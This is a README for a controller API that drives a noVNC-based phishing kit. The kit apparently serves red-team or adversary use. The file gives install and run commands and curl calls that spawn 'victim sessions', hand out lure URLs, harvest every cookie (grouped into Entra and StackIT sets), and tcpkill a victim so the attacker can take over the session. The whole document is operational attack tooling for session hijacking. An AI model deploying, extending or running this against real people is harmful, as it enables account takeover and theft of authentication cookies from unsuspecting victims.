# NoPhish Controller API

Control plane for NoPhish so an orchestrator (e.g. ConsentFix) can spawn, inspect,
harvest and tear down victim sessions on demand. This complements `setup.sh`, which is
launch-time only.

The controller reuses the existing `VNC-Dockerfile` / `PROXY-Dockerfile` images and the
`rev-proxy` apache container. It adds/removes per-session config files at runtime and
reloads apache gracefully, so no giant vhost rewrite is needed. Desktop containers only
for now.

## Install

```bash
cd controller
pip install -r requirements.txt
```

Build the NoPhish images once (same as `setup.sh install`):

```bash
sudo docker build -t vnc-docker -f ../VNC-Dockerfile ../
sudo docker build -t rev-proxy -f ../PROXY-Dockerfile ../
```

## Run

```bash
export CONTROLLER_API_KEY="s3cret"
export NOPHISH_DOMAIN="phish.example.com"     # public host for victim URLs
export NOPHISH_SSL="false"                    # "true" + NOPHISH_CERT/KEY for https
python3 controller.py                          # binds :6600
```

The images and the `rev-proxy` container are created automatically on the first
`POST /api/sessions`.

## API

All `/api/*` calls need `X-API-Key: <CONTROLLER_API_KEY>`.

```bash
# create a session (target = where the container's Firefox starts)
curl -sX POST localhost:6600/api/sessions \
  -H "X-API-Key: $CONTROLLER_API_KEY" -H 'Content-Type: application/json' \
  -d '{"lure_id":"abc","target":"https://consentfix.example/stackit?lure=abc"}'
# -> {"session_id":"...","url":"http://phish.example.com/s/<slug>","status":"active",...}

curl -s localhost:6600/api/sessions -H "X-API-Key: $CONTROLLER_API_KEY"
curl -s localhost:6600/api/sessions/<id>/cookies -H "X-API-Key: $CONTROLLER_API_KEY"
curl -sX POST localhost:6600/api/sessions/<id>/disconnect -H "X-API-Key: $CONTROLLER_API_KEY"
curl -sX POST localhost:6600/api/sessions/<id>/release -H "X-API-Key: $CONTROLLER_API_KEY"
```

`GET /api/sessions/<id>/cookies` returns all cookies plus grouped `entra` and `stackit`
sets. `disconnect` `tcpkill`s the victim and re-points their session URL for takeover.

## Notes

- Requires docker (default `sudo docker`; override with `DOCKER_CMD`).
- Hand out the `url` to the victim; it renders the noVNC client pointing at the target.
- `release` removes the container but keeps the state entry for the lure.
